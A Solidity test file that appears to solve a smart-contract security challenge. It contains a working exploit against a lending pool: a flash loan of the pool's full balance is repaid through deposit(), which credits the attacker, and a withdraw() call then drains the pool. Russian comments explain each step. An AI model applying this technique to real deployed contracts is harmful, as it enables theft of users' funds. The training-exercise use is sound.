// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/08_LendingPool/LendingPool.sol";

// forge test --match-contract LendingPoolTest -vvvv
contract LendingPoolTest is BaseTest {
    LendingPool instance;

    function setUp() public override {
        super.setUp();
        instance = new LendingPool{value: 0.1 ether}();
    }

    function testExploitLevel() public { 
        Exploit exploit = new Exploit();
        exploit.attack(instance);
        exploit.withdraw(instance);

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}

// уязвимость в том, что мы можем вернуть flashLoan одновременно с депозитом
contract Exploit {
    // берем займ по размеру баланса контракта
    function attack(LendingPool instance) external {
        instance.flashLoan(address(instance).balance);
    }

    // выводим всю сумму занятых денег
    function withdraw(LendingPool instance) public {
        instance.withdraw();
    }
    
    // функция, которую вызывает контракт пула, чтобы отправить деньги при займе
    function execute() public payable {
        // возвращаем баланс на контракт, но зачисляют нам его на msg.sender
        LendingPool(msg.sender).deposit{value:msg.value}();
    }

    // если на контракт отправляют ether, то надо его принять а не ревертить
    receive() external payable {}
}